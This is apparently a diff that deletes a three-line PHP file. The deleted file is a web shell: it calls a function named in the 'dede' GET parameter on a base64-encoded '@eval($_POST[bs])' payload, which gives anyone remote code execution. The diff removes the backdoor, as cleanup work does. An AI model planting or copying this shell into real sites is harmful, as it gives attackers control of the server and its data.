@@ -1,3 +1,0 @@
-<?php 
-    call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7')); 
-?>
